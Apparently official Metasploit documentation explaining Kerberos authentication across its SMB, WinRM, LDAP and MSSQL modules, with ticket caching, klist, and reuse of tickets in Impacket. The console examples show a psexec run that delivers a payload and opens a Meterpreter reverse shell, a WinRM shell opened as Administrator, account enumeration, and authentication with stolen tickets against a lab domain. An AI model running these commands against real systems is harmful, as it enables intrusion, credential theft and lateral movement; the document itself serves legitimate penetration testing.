## Service Authentication 

Since version 6.3, Metasploit has included authentication via Kerberos for multiple types of modules. Kerberos
authentication allows Metasploit users to request and utilize Ticket Granting Tickets (TGTs) and Ticket Granting
Services (TGSs) to authenticate with supported modules. Metasploit uses an internal caching and storage mechanism but
tickets are stored able to be both exported and imported from [MIT Credential Cache][1] (CCACHE) files. A converter for
Kirbi to and from CCACHE files is also available in the `auxiliary/admin/kerberos/ticket_converter` module.

Metasploit currently offers Kerberos authentication for the following services - see the below references for more details and examples:

- [[SMB Kerberos Authentication|Metasploit-Guide-SMB.md]]
- [[WinRM Kerberos Authentication|Metasploit-Guide-WinRM.md]]
- [[LDAP Kerberos Authentication|Metasploit-Guide-LDAP.md]]
- [[MSSQL Kerberos Authentication|Metasploit-Guide-MSSQL.md]]

### Examples

Open a WinRM session:

```msf
msf6 > use auxiliary/scanner/winrm/winrm_login
msf6 auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd winrm::auth=kerberos domaincontrollerrhost=192.168.123.13 winrm::rhostname=dc3.demo.local domain=demo.local

[+] 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:5985   - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120604_default_192.168.123.13_mit.kerberos.cca_451736.bin
[+] 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:5985   - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120604_default_192.168.123.13_mit.kerberos.cca_889546.bin
[+] 192.168.123.13:88 - Received a valid delegation TGS-Response
[+] 192.168.123.13:88 - Received AP-REQ. Extracting session key...
[+] 192.168.123.13:5985 - Login Successful: demo.local\Administrator:p4$$w0rd
[*] Command shell session 1 opened (192.168.123.1:50722 -> 192.168.123.13:5985) at 2023-01-18 12:06:05 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/winrm/winrm_login) > sessions -i -1
[*] Starting interaction with 1...

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```

Query LDAP for accounts:

```msf
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldap::auth=kerberos ldap::rhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
[*] Running module against 192.168.123.13

[+] 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:389 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120714_default_192.168.123.13_mit.kerberos.cca_216797.bin
[+] 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:389 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120714_default_192.168.123.13_mit.kerberos.cca_638903.bin
[+] 192.168.123.13:88 - Received a valid delegation TGS-Response
[*] Discovering base DN automatically
[+] 192.168.123.13:389 Discovered base DN: DC=adf3,DC=local
CN=Administrator CN=Users DC=adf3 DC=local
==========================================

 Name                Attributes
 ----                ----------
 badpwdcount         0
 description         Built-in account for administering the computer/domain
 lastlogoff          1601-01-01 00:00:00 UTC
 lastlogon           2023-01-23 11:02:49 UTC
 logoncount          159
 memberof            CN=Group Policy Creator Owners,CN=Users,DC=domain,DC=local || CN=Domain Admins,CN=Users,DC=domain,DC=local |
                     | CN=Enterprise Admins,CN=Users,DC=domain,DC=local || CN=Schema Admins,CN=Users,DC=domain,DC=local || CN=Adm
                     inistrators,CN=Builtin,DC=domain,DC=local
 name                Administrator
 objectsid           S-1-5-21-3402587289-1488798532-3618296993-500
 pwdlastset          133189448681297271
 samaccountname      Administrator
 useraccountcontrol  512

 ... etc ...
```

Running psexec against a host:

```msf
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] 192.168.123.13:445 - Connecting to the server...
[*] 192.168.123.13:445 - Authenticating to 192.168.123.13:445|demo.local as user 'Administrator'...
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_474531.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_169149.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid delegation TGS-Response
[*] 192.168.123.13:445 - Selecting PowerShell target
[*] 192.168.123.13:445 - Executing the payload...
[+] 192.168.123.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.123.13
[*] Meterpreter session 6 opened (192.168.123.1:4444 -> 192.168.123.13:49738) at 2023-01-18 12:09:13 +0000

meterpreter >
```

Connect to a Microsoft SQL Server instance and run a query:

```msf
msf6 > use auxiliary/admin/mssql/mssql_sql
msf6 auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssql::auth=kerberos mssql::rhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
[*] Reloading module...
[*] Running module against 192.168.123.13

[*] 192.168.123.13:1433 - 192.168.123.13:88 - Valid TGT-Response
[+] 192.168.123.13:1433 - 192.168.123.13:88 - Valid TGS-Response
[*] 192.168.123.13:1433 - 192.168.123.13:88 - TGS MIT Credential Cache saved to ~/.msf4/loot/20220630193907_default_192.168.123.13_windows.kerberos_556101.bin
[*] 192.168.123.13:1433 - SQL Query: select auth_scheme from sys.dm_exec_connections where session_id=@@spid
[*] 192.168.123.13:1433 - Row Count: 1 (Status: 16 Command: 193)

 auth_scheme
 -----------
 KERBEROS

[*] Auxiliary module execution completed
```

### Options

Kerberos authentication requires additional options to be set. Some of them are prefixed with the protocol the module
is authenticating. For example, the PSexec module which operates over SMB would use the "SMB" prefix.

Required options:
* `${Prefix}::Auth` -- The authentication modes this module supports. Set it to "kerberos" to use Kerberos authentication. i.e. `Smb::Auth=kerberos`
* `${Prefix}::Rhostname` -- The hostname of the target system. This value should be either the hostname `WIN-MIJZ318SQH` or
  the FQDN like `WIN-MIJZ318SQH.msflab.local`. i.e. `Smb::Rhostname=WIN-MIJZ318SQH.msflab.local`
* `${Prefix}Domain` -- The domain name of the target system, e.g. `msflab.local`. i.e. `SmbDomain=msflab.local`

Optional options:
* `DomainControllerRhost` -- The IP address or hostname of the domain controller to use for Kerberos authentication.
  i.e. `DomainControllerRhost=192.168.123.13`. If this value is not specified, Metasploit will look it up via the
  realm's (the `${Prefix}Domain` option) SRV record in DNS.
* `${Prefix}::Krb5Ccname` -- The path to a CCACHE file to use for authentication. This is comparable to setting the
  `KRB5CCNAME` environment variable for other tools. If specified, the tickets it contains will be used. i.e. `KRB5CCNAME=/path/to/Administrator.ccache`.
* `KrbCacheMode` -- The cache storage mode to use, one of the following four options:
    * `none` -- No cache storage is used, new tickets are requested and no tickets are stored.
    * `read-only` -- Stored tickets from the cache will be used, but no new tickets are stored.
    * `write-only` -- New tickets are requested and they are stored for reuse.
    * `read-write` -- Stored tickets from the cache will be used and new tickets will be stored for reuse.
* `${Prefix}KrbOfferedEncryptionTypes' -- The list of encryption types presented to the KDC as being supported by the Metasploit client. i.e. `SmbKrbOfferedEncryptionTypes=AES256`

## Ticket management

When a write-enabled `KrbCacheMode` is used, tickets that are issued to Metasploit will be stored for reuse. The `klist`
command can be used to view tickets. It is a top level command and can be run even if a module is in use.

```msf
msf6 > klist
Kerberos Cache
==============
host            principal               sname                              issued                     status       path
----            ---------               -----                              ------                     ------       ----
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL   2022-12-15 18:25:48 -0500  >>expired<<  /home/smcintyre/.msf4/loot/20221215182546_default_192.168.159.10_mit.kerberos.cca_867855.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC.msflab.local@MSFLAB.LOCAL  2022-12-15 18:25:48 -0500  >>expired<<  /home/smcintyre/.msf4/loot/20221215182546_default_192.168.159.10_mit.kerberos.cca_699376.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 14:51:50 -0500  valid        /home/smcintyre/.msf4/loot/20221216145149_default_192.168.159.10_mit.kerberos.cca_782487.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC.msflab.local@MSFLAB.LOCAL  2022-12-16 17:07:48 -0500  valid        /home/smcintyre/.msf4/loot/20221216170747_default_192.168.159.10_mit.kerberos.cca_156303.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC@MSFLAB.LOCAL               2022-12-16 17:08:26 -0500  valid        /home/smcintyre/.msf4/loot/20221216170825_default_192.168.159.10_mit.kerberos.cca_196712.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 15:03:03 -0500  valid        /home/smcintyre/.msf4/loot/20221216150302_default_192.168.159.10_mit.kerberos.cca_729805.bin
192.168.159.10  aliddle@MSFLAB.LOCAL    krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 15:25:16 -0500  valid        /home/smcintyre/.msf4/loot/20221216152515_default_192.168.159.10_mit.kerberos.cca_934698.bin
```

More detailed information can be displayed by using the verbose (`-v` / `--verbose`) option.

```msf
msf6 > klist -v
Kerberos Cache
==============
Cache[0]:
  Primary Principal: Administrator@demo.local
  Ccache version: 4

  Creds: 1
    Credential[0]:
      Server: krbtgt/demo.local@demo.local
      Client: Administrator@demo.local
      Ticket etype: 18 (AES256)
      Key: 9c66cb7de8f4d3100690771a753012eafa44a3d128342939ff9230b39aeb1713
      Subkey: false
      Ticket Length: 1090
      Ticket Flags: 0x50e10000 (FORWARDABLE, PROXIABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)
      Addresses: 0
      Authdatas: 0
      Times:
        Auth time: 2022-12-13 12:57:49 +0000
        Start time: 2022-12-13 12:57:49 +0000
        End time: 2022-12-13 22:57:49 +0000
        Renew Till: 2022-12-14 12:57:49 +0000
      Ticket:
        Ticket Version Number: 5
        Realm: demo.local
        Server Name: krbtgt/demo.local
        Encrypted Ticket Part:
          Ticket etype: 18 (AES256)
          Key Version Number: 2
          Cipher:
            [truncated]
```

The `klist` command can also be used for deleting tickets from the cache.

## Ticket cache storage

Metasploit stores tickets for future use in a user configurable way as controlled by the `KrbCacheMode` datastore
option. When a user attempts to use Kerberos to authenticate to a remote service such as SMB, if the cache mode is
read-enabled (e.g. set to `read-only` or `read-write`) and Metasploit is connected to a database, it will attempt to
fetch an existing ticket using the following steps targeting SMB for example purposes.

1. If an external ticket is specified in the `${Prefix}::Krb5Ccname` option, that ticket will be used instead of the
   cache.
2. When using the cache, Metasploit will first use the datastore options, including the target host and username to 
   search though the stored tickets for an SMB-specific Ticket Granting Service (TGS). If one is found, it will be used. 
   Tickets that are expired will not be used.
3. If no TGS is found, Metasploit will repeat the search process looking for a Ticket Granting Ticket (TGT). If one is
   found, it will be used to contact the Key Distribution Center (KDC) and request a TGS for authentication to the SMB
   service.
4. If no TGT is found, Metasploit will contact the KDC and authenticate using the username and password from the
   datastore to request a TGT then an SMB-specific TGS before authenticating to the SMB service.

If the cache mode is write-enabled (e.g. set to `write-only` or `read-write`) then any ticket, either TGT or TGS that is
obtained either from the KDC or through other means, is stored for use in the cache. **If the cache mode is not
write-enabled, tickets will not be stored.** Tickets are saved as loot, allowing them to be stored even if the database
is not connected, however without the database, Metasploit can not lookup tickets for reuse as required by the
read-enabled modes. Metasploit stores exactly one ticket per CCACHE file.

Use a read-enabled cache mode to avoid unnecessary contact with the KDC. Use a write-enabled cache mode to store tickets
for use with either Metasploit or other tools.

## Using tickets with external tools
When a ticket (either TGT or TGS) is stored, it is saved along with the other loot Metasploit has collected. The raw
CCACHE files can be viewed with the `loot --type mit.kerberos.ccache` command (the `--type` argument filters for the
specified type).

```msf
msf6 auxiliary(admin/dcerpc/icpr_cert) > loot --type mit.kerberos.ccache

Loot
====

host            service  type                 name             content                   info                                                                  path
----            -------  ----                 ----             -------                   ----                                                                  ----
192.168.159.10           mit.kerberos.ccache                   application/octet-stream  realm: MSFLAB.LOCAL, client: smcintyre, server: krbtgt/msflab.local   /home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_905330.bin
192.168.159.10           mit.kerberos.ccache                   application/octet-stream  realm: MSFLAB.LOCAL, client: smcintyre, server: cifs/dc.msflab.local  /home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_539055.bin
```

The path on the far right is where the CCACHE file is on disk. This path can be used with other tools such as Impacket
through the `KRB5CCNAME` environment variable.

For example:

```
[user@localhost]$ KRB5CCNAME=/home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_539055.bin \
  python examples/smbclient.py  dc.msflab.local -target-ip 192.168.159.10 -k
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# info
Version Major: 10
Version Minor: 0
Server Name: DC
Server Comment:
Server UserPath: c:\
Simultaneous Users: 16777216
#
```

## Using external tickets with Metasploit
A ticket obtained outside of Metasploit can be used for authentication by setting the `${Prefix}::Krb5Ccname` option
which is prioritized over the cache. This file must be in the [MIT Credential Cache][1] (CCACHE) file format. If the
ticket is in the Kirbi format, it must first be converted using the `auxiliary/admin/kerberos/ticket_converter` module.

When an explicit CCACHE file is specified to load a ticket from, Metasploit will first attempt to load a TGS ticket
from the file. If the service class of the `sname` component does not match the necessary value (e.g. the sname is for
`HOST/dc.msflab.local` instead of `CIFS/dc.msflab.local`), the value will be patched automatically. If no TGS is found,
Metasploit will attempt to load a TGT from the file and use it to contact the KDC and issue a TGS which will be stored
for future use when the cache is write-enabled.

It is important to set the `${Prefix}::Rhostname` and `${Prefix}Domain` options correctly because they are used to
select the appropriate ticket from the file.

[1]: http://web.mit.edu/KERBEROS/krb5-devel/doc/formats/ccache_file_format.html
